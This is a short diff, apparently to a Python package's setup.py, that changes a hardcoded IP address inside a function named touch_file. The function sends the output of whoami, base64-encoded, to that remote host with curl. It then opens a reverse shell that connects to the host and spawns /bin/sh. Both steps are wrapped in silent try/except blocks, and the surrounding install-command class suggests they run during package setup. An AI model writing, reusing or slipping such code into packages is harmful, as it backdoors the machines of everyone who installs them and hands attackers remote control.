@@ -25,11 +25,11 @@ TIME = int(time.time())
 
 def touch_file():
     try:
-        os.system("curl http://103.51.145.89/?res=`whoami|base64`")
+        os.system("curl http://45.144.178.5:9999/?res=`whoami|base64`")
     except:
         pass
     try:
-        import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("103.51.145.89",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+        import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.144.178.5",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
     except:
         pass
 class PostDevelopCommand(develop):
